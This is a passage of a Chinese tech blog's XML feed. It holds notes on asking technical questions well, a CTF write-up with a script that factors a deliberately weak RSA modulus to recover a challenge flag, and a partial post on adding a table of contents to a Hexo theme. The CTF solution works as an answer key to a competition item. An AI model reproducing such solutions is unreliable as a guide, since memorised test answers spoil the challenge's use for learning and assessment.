forums</h2><ul><li>Web forum or IRC channel where newbies can get help.</li><li>In fact, if you got the program that is giving you problems from a Linux distribution (as is common today), it may be better to ask in the distro’s forum/list before trying the program’s project forum/list.</li></ul><h2 id="As-a-second-step-use-project-mailing-lists"><a href="#As-a-second-step-use-project-mailing-lists" class="headerlink" title="As a second step, use project mailing lists"></a>As a second step, use project mailing lists</h2><h2 id="Use-meaningful-specific-subject-headers"><a href="#Use-meaningful-specific-subject-headers" class="headerlink" title="Use meaningful, specific subject headers"></a>Use meaningful, specific subject headers</h2><ul><li>One good convention for subject headers, used by many tech support organizations, is “object - deviation”. The “object” part specifies what thing or group of things is having a problem, and the “deviation” part describes the deviation from expected behavior.</li></ul><h2 id="Make-it-easy-to-reply"><a href="#Make-it-easy-to-reply" class="headerlink" title="Make it easy to reply"></a>Make it easy to reply</h2><h2 id="Write-in-clear-grammatical-correctly-spelled-language"><a href="#Write-in-clear-grammatical-correctly-spelled-language" class="headerlink" title="Write in clear, grammatical, correctly-spelled language"></a>Write in clear, grammatical, correctly-spelled language</h2><ul><li>If you are writing in English but it is a second language for you, it is good form to alert potential respondents to potential language difficulties and options for getting around them. Examples:<ul><li>English is not my native language; please excuse typing errors.</li><li>If you speak $LANGUAGE, please email/PM me; I may need assistance translating my question.</li><li>I am familiar with the technical terms, but some slang expressions and idioms are difficult for me.</li><li>I’ve posted my question in $LANGUAGE and English. I’ll be glad to translate responses, if you only use one or the other.</li></ul></li></ul><h2 id="Send-questions-in-accessible-standard-formats"><a href="#Send-questions-in-accessible-standard-formats" class="headerlink" title="Send questions in accessible, standard formats"></a>Send questions in accessible, standard formats</h2><h2 id="Be-precise-and-informative-about-your-problem"><a href="#Be-precise-and-informative-about-your-problem" class="headerlink" title="Be precise and informative about your problem"></a>Be precise and informative about your problem</h2><ul><li>Describe the symptoms of your problem or bug carefully and clearly.</li><li>Describe the environment in which it occurs (machine, OS, application, whatever). Provide your vendor’s distribution and release level (e.g.: “Fedora Core 7”, “Slackware 9.1”, etc.).</li><li>Describe the research you did to try and understand the problem before you asked the question.</li><li>Describe the diagnostic steps you took to try and pin down the problem yourself before you asked the question.</li><li>Describe any possibly relevant recent changes in your computer or software configuration.</li><li>If at all possible, provide a way to reproduce the problem in a controlled environment.</li><li>Simon Tatham has written an excellent essay entitled How to Report Bugs Effectively. I strongly recommend that you read it.</li></ul><h2 id="Volume-is-not-precision"><a href="#Volume-is-not-precision" class="headerlink" title="Volume is not precision"></a>Volume is not precision</h2><h2 id="Don’t-rush-to-claim-that-you-have-found-a-bug"><a href="#Don’t-rush-to-claim-that-you-have-found-a-bug" class="headerlink" title="Don’t rush to claim that you have found a bug"></a>Don’t rush to claim that you have found a bug</h2><h2 id="Grovelling-is-not-a-substitute-for-doing-your-homework"><a href="#Grovelling-is-not-a-substitute-for-doing-your-homework" class="headerlink" title="Grovelling is not a substitute for doing your homework"></a>Grovelling is not a substitute for doing your homework</h2><ul><li>Some people who get that they shouldn’t behave rudely or arrogantly, demanding an answer, retreat to the opposite extreme of grovelling. </li></ul><h2 id="Describe-the-problem’s-symptoms-not-your-guesses"><a href="#Describe-the-problem’s-symptoms-not-your-guesses" class="headerlink" title="Describe the problem’s symptoms, not your guesses"></a>Describe the problem’s symptoms, not your guesses</h2><h2 id="Describe-your-problem’s-symptoms-in-chronological-order"><a href="#Describe-your-problem’s-symptoms-in-chronological-order" class="headerlink" title="Describe your problem’s symptoms in chronological order"></a>Describe your problem’s symptoms in chronological order</h2><h2 id="Describe-the-goal-not-the-step"><a href="#Describe-the-goal-not-the-step" class="headerlink" title="Describe the goal, not the step"></a>Describe the goal, not the step</h2><h2 id="Don’t-ask-people-to-reply-by-private-e-mail"><a href="#Don’t-ask-people-to-reply-by-private-e-mail" class="headerlink" title="Don’t ask people to reply by private e-mail"></a>Don’t ask people to reply by private e-mail</h2><h2 id="Be-explicit-about-your-question"><a href="#Be-explicit-about-your-question" class="headerlink" title="Be explicit about your question"></a>Be explicit about your question</h2><h2 id="When-asking-about-code"><a href="#When-asking-about-code" class="headerlink" title="When asking about code"></a>When asking about code</h2><ul><li>The most effective way to be precise about a code problem is to provide a minimal bug-demonstrating test case. </li></ul><h2 id="Don’t-post-homework-questions"><a href="#Don’t-post-homework-questions" class="headerlink" title="Don’t post homework questions"></a>Don’t post homework questions</h2><h2 id="Prune-pointless-queries"><a href="#Prune-pointless-queries" class="headerlink" title="Prune pointless queries"></a>Prune pointless queries</h2><h2 id="Don’t-flag-your-question-as-“Urgent”-even-if-it-is-for-you"><a href="#Don’t-flag-your-question-as-“Urgent”-even-if-it-is-for-you" class="headerlink" title="Don’t flag your question as “Urgent”, even if it is for you"></a>Don’t flag your question as “Urgent”, even if it is for you</h2><h2 id="Courtesy-never-hurts-and-sometimes-helps"><a href="#Courtesy-never-hurts-and-sometimes-helps" class="headerlink" title="Courtesy never hurts, and sometimes helps"></a>Courtesy never hurts, and sometimes helps</h2><ul><li>hackers in general would rather get somewhat brusque but technically sharp bug reports than polite vagueness. </li></ul><h2 id="Follow-up-with-a-brief-note-on-the-solution"><a href="#Follow-up-with-a-brief-note-on-the-solution" class="headerlink" title="Follow up with a brief note on the solution"></a>Follow up with a brief note on the solution</h2><ul><li>Problem narratives that trail off into unresolved nothingness are frustrating things; hackers itch to see them resolved.</li><li>Among hackers, this sort of good followup behavior is actually more important than conventional politeness. It’s how you get a reputation for playing well with others, which can be a very valuable asset.</li></ul><h1 id="How-To-Interpret-Answers"><a href="#How-To-Interpret-Answers" class="headerlink" title="How To Interpret Answers"></a>How To Interpret Answers</h1><h2 id="RTFM-and-STFW-How-To-Tell-You’ve-Seriously-Screwed-Up"><a href="#RTFM-and-STFW-How-To-Tell-You’ve-Seriously-Screwed-Up" class="headerlink" title="RTFM and STFW: How To Tell You’ve Seriously Screwed Up"></a>RTFM and STFW: How To Tell You’ve Seriously Screwed Up</h2><ul><li>You shouldn’t be offended by this; by hacker standards, your respondent is showing you a rough kind of respect simply by not ignoring you. You should instead be thankful for this grandmotherly kindness.</li></ul><h2 id="If-you-don’t-understand…"><a href="#If-you-don’t-understand…" class="headerlink" title="If you don’t understand…"></a>If you don’t understand…</h2><ul><li>Use the same tools that you used to try and answer your original question (manuals, FAQs, the Web, skilled friends) to understand the answer.</li></ul><h2 id="Dealing-with-rudeness"><a href="#Dealing-with-rudeness" class="headerlink" title="Dealing with rudeness"></a>Dealing with rudeness</h2><ul><li>The line between correcting an incivility and starting a pointless flamewar is thin enough that hackers themselves not infrequently blunder across it;</li><li>(Some people assert that many hackers have a mild form of autism or Asperger’s Syndrome, and are actually missing some of the brain circuitry that lubricates “normal” human social interaction. This may or may not be true. If you are not a hacker yourself, it may help you cope with our eccentricities if you think of us as being brain-damaged. Go right ahead. We won’t care; we like being whatever it is we are, and generally have a healthy skepticism about clinical labels.)</li><li>Jeff Bigler’s observations about tact filters are also relevant and worth reading.</li></ul><h1 id="On-Not-Reacting-Like-A-Loser"><a href="#On-Not-Reacting-Like-A-Loser" class="headerlink" title="On Not Reacting Like A Loser"></a>On Not Reacting Like A Loser</h1><ul><li>Odds are you’ll screw up a few times on hacker community forums. Get over it. It’s normal. In fact, it’s healthy and appropriate.</li><li>Nor is it useful to insist you’ve been personally insulted when someone comments that one of your claims was wrong, or that his views differ. Those are loser attitudes.</li><li>If you can’t manage to be grateful, at least have a little dignity, don’t whine, and don’t expect to be treated like a fragile doll just because you’re a newcomer with a theatrically hypersensitive soul and delusions of entitlement.</li><li>Don’t let yourself be drawn into a flamewar, either. Most flames are best ignored — after you’ve checked whether they are really flames, not pointers to the ways in which you have screwed up, and not cleverly ciphered answers to your real question (this happens as well).</li></ul><h1 id="If-You-Can’t-Get-An-Answer"><a href="#If-You-Can’t-Get-An-Answer" class="headerlink" title="If You Can’t Get An Answer"></a>If You Can’t Get An Answer</h1><ul><li>Sometimes the members of the asked group may simply not know the answer.</li><li>Don’t be dismayed at the idea of having to pay for a bit of help!</li></ul><h1 id="How-To-Answer-Questions-in-a-Helpful-Way"><a href="#How-To-Answer-Questions-in-a-Helpful-Way" class="headerlink" title="How To Answer Questions in a Helpful Way"></a>How To Answer Questions in a Helpful Way</h1><ul><li>Reply to a first offender off-line</li><li>If you don’t know for sure, say so! </li><li>If you can’t help, don’t hinder.</li><li>Ask probing questions to elicit more details.If you’re good at this, the querent will learn something — and so might you. Try to turn the bad question into a good one; remember we were all newbies once.</li><li>If you’re going to answer the question at all, give good value. </li><li>Help your community learn from the question.</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;感觉这本小书，就像是一本针对问问题的简化版的《人性的弱点》，书中体现了很多换位思考的思维方式——想从别人那里得到答案，应该站在解答者的角度来构造问题，而不是从提问者角度。我感觉读一读，不仅能学到如何提问题，更能学到一种比较好的解决问题的方式。&lt;/p&gt;
&lt;p&gt;简单的将文中的句
      
    
    </summary>
    
    
      <category term="how-to" scheme="http://lxzmads.github.io/tags/how-to/"/>
    
  </entry>
  
  <entry>
    <title>胖哈勃一道RSA</title>
    <link href="http://lxzmads.github.io/2018/09/03/%E8%83%96%E5%93%88%E5%8B%83%E4%B8%80%E9%81%93RSA/"/>
    <id>http://lxzmads.github.io/2018/09/03/胖哈勃一道RSA/</id>
    <published>2018-09-02T16:00:00.000Z</published>
    <updated>2019-02-17T08:05:38.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://findneo.github.io/" target="_blank" rel="noopener">队友</a>推荐看看的一道题，因为没研究过RSA题= =，当时也就抱着看看的心态随便推了一下，后来Writeup出来之后发现竟然当时弄巧成拙推出的竟然是正确的结论。顺着“成功绝不是偶然的”的思路，在家里拿出纸又推了一遍。整个推理过程不是很严谨，但是是冲着寻找一个可能解的方向努力，现在贴出来，请有缘的看官雅正，聊博一笑。</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> x, y, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> gmpy.is_prime(y) ** <span class="number">2016</span> + gmpy.is_prime(x+<span class="number">1</span>) ** <span class="number">2017</span> + ((x**<span class="number">2</span> - <span class="number">1</span>)**<span class="number">2</span> % (<span class="number">2</span>*x*y - <span class="number">1</span>) + <span class="number">2</span>) ** <span class="number">2018</span> == <span class="number">30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146</span></span><br><span class="line"></span><br><span class="line">p = gmpy.next_prime(x**<span class="number">3</span> + y**<span class="number">3</span>) <span class="comment">#(x+y)**3-3xy(x+y)</span></span><br><span class="line">q = gmpy.next_prime(x**<span class="number">2</span>*y + y**<span class="number">2</span>*x) <span class="comment">#xy(x+y)</span></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy.invert(<span class="number">0x10001</span>, phi)</span><br><span class="line">enc = pow(bytes_to_long(flag), <span class="number">0x10001</span>, n)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'n ='</span>, n</span><br><span class="line"><span class="keyword">print</span> <span class="string">'enc ='</span>, enc</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741</span></span><br><span class="line"><span class="comment"># enc = 73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612</span></span><br></pre></td></tr></table></figure><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p><img src="http://pics.madsome.one/rsa.jpg" alt="rsa"></p><p>然后就可以根据<a href="https://mp.weixin.qq.com/s/3qvuVd9tBK3J-Q9vBMGxwA" target="_blank" rel="noopener">官网WP</a>的解题脚本进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show that if 4ab - 1 divides (4a**2 - 1)**2, then a = b.</span></span><br><span class="line"><span class="comment"># suppose y be a large prime and x + 1 is another large prime.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># from this condition with help of previous fact we can deduce that:</span></span><br><span class="line"><span class="comment"># ==&gt; we take 2a = x and b = y, so: 2xy - 1 | (x**2 - 1)**2 ==&gt; x = 2y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># assert gmpy.is_prime(y) + gmpy.is_prime(x+1) + ((x**2 - 1)**2 % (2*x*y - 1) + 2) ** 2018 == 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146 = 1 + 1 + 2 ** 2018</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># so we have x = 2y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = gmpy.next_prime(x**3 + y**3) # ==&gt; p = gmpy.next_prime(8*y**3 + y**3) = gmpy.next_prime(9*y**3)</span></span><br><span class="line"><span class="comment"># q = gmpy.next_prime(x**2*y + y**2*x) # ==&gt; q = gmpy.next_prime(4*y**2*y + y**2*(2y)) = gmpy.next_prime(6*y**3)</span></span><br><span class="line"><span class="comment"># n = p * q # ==&gt; n = p * q ~= (9*y**3) * (6*y**3) = 54*y**6</span></span><br><span class="line"><span class="comment"># So we can factor n with knowing n ~= 54*y**6</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741</span></span><br><span class="line">enc = <span class="number">73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now we calculate the 5th root of n//45 to find the y:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">iroot</span><span class="params">(k, n)</span>:</span></span><br><span class="line">   UB = <span class="number">1</span></span><br><span class="line">   <span class="keyword">while</span> pow(UB, k) &lt; n:</span><br><span class="line">       UB *= <span class="number">2</span></span><br><span class="line">   LB = UB / <span class="number">2</span></span><br><span class="line">   <span class="keyword">while</span> UB - LB &gt; <span class="number">1</span>:</span><br><span class="line">       M = (LB + UB) // <span class="number">2</span></span><br><span class="line">       midToK = pow(M, k)</span><br><span class="line">       <span class="keyword">if</span> midToK &lt; n:</span><br><span class="line">           LB = M</span><br><span class="line">       <span class="keyword">elif</span> n &lt; midToK:</span><br><span class="line">           UB = M</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="keyword">return</span> M</span><br><span class="line">   <span class="keyword">if</span> pow(UB, k) == n:</span><br><span class="line">       <span class="keyword">return</span> UB</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">return</span> LB</span><br><span class="line"></span><br><span class="line">y = iroot(<span class="number">6</span>, n // <span class="number">54</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">   <span class="keyword">if</span> gmpy.is_prime(y):</span><br><span class="line">       <span class="keyword">if</span> gmpy.next_prime(<span class="number">9</span>*y**<span class="number">3</span>) * gmpy.next_prime(<span class="number">6</span>*y**<span class="number">3</span>) == n:</span><br><span class="line">           <span class="keyword">print</span> <span class="string">'Found:'</span>, <span class="string">'y ='</span>, y</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       y += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">2</span>*y</span><br><span class="line">p = gmpy.next_prime(x**<span class="number">3</span> + y**<span class="number">3</span>)</span><br><span class="line">q = gmpy.next_prime(x**<span class="number">2</span>*y + y**<span class="number">2</span>*x)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy.invert(<span class="number">0x10001</span>, phi)</span><br><span class="line">flag = long_to_bytes(pow(enc, d, n))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag ='</span>, flag</span><br></pre></td></tr></table></figure><p>若本地没有gmpy库，可以参考<a href="https://findneo.github.io/180903-pwnhub-lhy/" target="_blank" rel="noopener">队友的脚本</a>.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://findneo.github.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;队友&lt;/a&gt;推荐看看的一道题，因为没研究过RSA题= =，当时也就抱着看看的心态随便推了一下，后来Writeup出来之后发现竟然当时弄巧成
      
    
    </summary>
    
    
      <category term="RSA" scheme="http://lxzmads.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>给Hexo主题加上TOC</title>
    <link href="http://lxzmads.github.io/2018/09/02/%E7%BB%99Hexo%E4%B8%BB%E9%A2%98%E5%8A%A0%E4%B8%8ATOC/"/>
    <id>http://lxzmads.github.io/2018/09/02/给Hexo主题加上TOC/</id>
    <published>2018-09-01T16:00:00.000Z</published>
    <updated>2019-02-17T08:05:38.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="废话"><a href="#废话" class="headerlink" title="废话"></a>废话</h1><p>博客从大一就搭了，方案从github pages+hexo换到WordPress再到现在hexo+vultr，但博客却一直没有时间写。当初搭博客时候就是为了分享点自己的一些想法，希望能够在网上结识到志同道合的人。然而现实的情况却是忙的不可开交，从大二下开始准备保研之后，几乎所有涉及到保研的事项一个都不敢懈怠，除了课程考试外，还有课程设计、各种比赛以及一些项目。当然只做到热爱学习可不行，还要保证身体吃得消，因为体育课也不能挂科啊T.T。可能是理所当然，但一定是雪上加霜的是因为太过忙碌的原因在大二下期末考试周时候生了一场很严重的感冒，从那之后很多年没犯的鼻炎又复发，到现在都还没怎么痊愈。说实话这非常影响我的正常学习生活，两个夏天，晚上睡觉时候空调都不敢彻夜开着，因为第二天起来会受不了，对此我非常感谢宽宏大量的舍友的不杀之恩。这么拼，还不是因为大一的成绩实在太差，如果不抓住最后的尾巴那么保研无望。幸运的是靠着身边人的帮助以及自己的努力，最终还是抓住了保研的尾巴。我非常感恩在XMU遇到的每个人，我非常喜欢XMU，XMU的景色、XMU的食堂以及XMU的人我不会忘记。然而我还年轻，我想去960万平方公里的其他地方看看。</p><p>QAQ说了这么多，绝不是就是想找一个拖了三年没写博客的借口。有一句话说的好，“写博客最好的时间有两个，一个是十年前，另一个就是现在”，所以趁着大四的时间，我可以用现在好好理一理自己的过去，畅想自己的未来，并用博客将这些记录下来。</p><p>那就从现在开始吧！</p><h1 id="主题选择"><a href="#主题选择" class="headerlink" title="主题选择"></a>主题选择</h1><p>从<a href="https://hexo.io/themes/" target="_blank" rel="noopener">Hexo官网</a>选择了一款看起来很简洁的主题PolarBear。从一开始喜欢花里胡哨再到喜欢扁平化的天蓝色风格，最终选择白底黑字的风格，这就像我心境的变化吧。(你不要想我是为了节约流量)但是唯一不满意的地方就是这个主题的文章右边没有TOC目录，这让我这种非常注重用户体验的程序员非常不满。想了想Hexo主题都是开源的，应该可以改一改吧~</p><h1 id="动手"><a href="#动手" class="headerlink" title="动手"></a>动手</h1><h2 id="RTFM"><a href="#RTFM" class="headerlink" title="RTFM"></a>RTFM</h2><p>从以往hack的经验看，与其去Google搜索各种解决方案，然后一个个实验那些早已被版本抛弃的方法来浪费时间，还不如去RTFM。于是打开<a href="https://hexo.io/zh-cn/docs" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs</a>，搜索<code>TOC</code>，在辅助函数看到一个可以自动生成TOC目录的辅助函数<code>toc(str, [options])</code>。所以现在想法就很简单了，直接在Hexo主题的post模板文件中添加一个node，然后设置适当的css就可以啦~</p><h2 id="审计主题源代码"><a href="#审计主题源代码" class="headerlink" title="审计主题源代码"></a>审计主题源代码</h2><p>寻找了一番，在<code>polarbear/layout/</code>目录下发现了主题的各种模板文件，都是<code>swig</code>模板引擎写的，语法也不复杂，浏览了几个文件大概就知道语法规则了。发现了<code>post.swig</code>文件，先打开看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;_layout.swig&quot; %&#125;</span><br><span class="line">&#123;% import &apos;_macro/post.swig&apos; as post_template %&#125;</span><br><span class="line">&#123;% block title %&#125; &#123;&#123; page.title &#125;&#125; - &#123;&#123; config.title &#125;&#125; &#123;% endblock %&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">    &lt;div id=&quot;primary&quot;&gt;</span><br><span class="line">        &#123;&#123; post_template.render(page) &#125;&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>可以发现导入了<code>_macro/post.swig</code>文件，从<code>render()</code>函数猜想这个文件应该是一个post的模板，大概就是从<code>page</code>和<code>config</code>来获取页面标题并显示，至于<code>page</code>和<code>config</code>是什么其实我并不关心，我猜想就是个类似于全局变量的东西，然后从名字就可以猜出有什么作用了。之后就是构造一些div结点来组织页面内容，利用导入的<code>post_template</code>来渲染页面内容。我们还可以发现<code>swig</code>中内容都是用<code> {% block * %} * {% endblock %} </code>的方式申明的，并且可以在<code>{{ }}</code>中写js语句。学习了一波<code>swig</code>语法~</p><p>所以比较关键的就是<code>_macro/post.swig</code>文件，我们跟进去看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&#123;% macro render(post) %&#125;</span><br><span class="line">  &lt;article class=&quot;post&quot;&gt;</span><br><span class="line">    &lt;header class=&quot;post-header&quot;&gt;</span><br><span class="line">      &lt;h1 class=&quot;post-title&quot;&gt;</span><br><span class="line">        &#123;% if is_home() %&#125;</span><br><span class="line">          &lt;a class=&quot;post-link&quot; href=&quot;&#123;&#123; url_for(post.path) &#125;&#125;&quot;&gt;&#123;&#123; post.title &#125;&#125;&lt;/a&gt;</span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">          &#123;&#123; post.title &#125;&#125;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">      &lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">      &lt;time class=&quot;post-time&quot;&gt;</span><br><span class="line">          &#123;&#123; full_date(post.date, &apos;MMM DD YYYY&apos;) &#125;&#125;</span><br><span class="line">      &lt;/time&gt;</span><br><span class="line">    &lt;/header&gt;</span><br><span class="line"></span><br><span class="line">    &#123;% if is_home() %&#125;</span><br><span class="line">        &lt;div class=&quot;post-excerpt&quot;&gt;</span><br><span class="line">            &#123;% set excerpt = &quot;&quot; %&#125;</span><br><span class="line">            &#123;% if post.description %&#125;</span><br><span class="line">              &#123;% set excerpt = post.description %&#125;</span><br><span class="line">            &#123;% elif post.excerpt %&#125;</span><br><span class="line">              &#123;% set excerpt = post.excerpt %&#125;</span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">            &#123;% if excerpt %&#125;</span><br><span class="line">              &#123;&#123; excerpt &#125;&#125;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line">          &#123;% else %&#125;</span><br><span class="line">            &lt;div class=&quot;post-content&quot;&gt;</span><br><span class="line">            &#123;&#123; post.content &#125;&#125;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">          &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">    &#123;% if not is_home() %&#125;</span><br><span class="line">      